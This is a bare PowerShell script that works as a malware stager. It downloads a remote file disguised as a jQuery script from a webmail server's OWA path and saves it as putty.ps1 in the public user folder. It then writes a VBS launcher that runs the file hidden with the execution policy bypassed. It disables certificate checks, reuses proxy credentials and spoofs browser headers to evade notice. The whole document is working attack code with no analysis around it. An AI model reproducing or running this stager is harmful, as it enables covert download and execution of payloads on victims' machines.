$url = 'https://webmail.lax.co.il/owa/auth/Current/Script/jquery-3.5.1.min.js'
$path = 'C:\users\public\putty.ps1'
$c = @"
Dim oShell
Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "powershell.exe -exec bypass -file C:\Users\Public\putty.ps1", 0
Set oShell = Nothing
"@
$f = "C:\Users\Public\db.vbs"
sc -path $f  -value $c
$WebClient = New-Object System.Net.WebClient
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
$WebProxy = [System.Net.WebRequest]::DefaultWebProxy;
$WebProxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
$WebClient.Proxy = $WebProxy;
$WebClient.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43')
$WebClient.Headers.Add('Accept-Encoding', 'gzip')
$WebClient.Headers.Add('Accept-Language', 'en-US,en;q=0.9,fa;q=0.8')
$WebClient.Headers.Add('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9')
$WebClient.Headers.Add('Upgrade-Insecure-Requests', '1')
$WebClient.DownloadFile($url,$path)

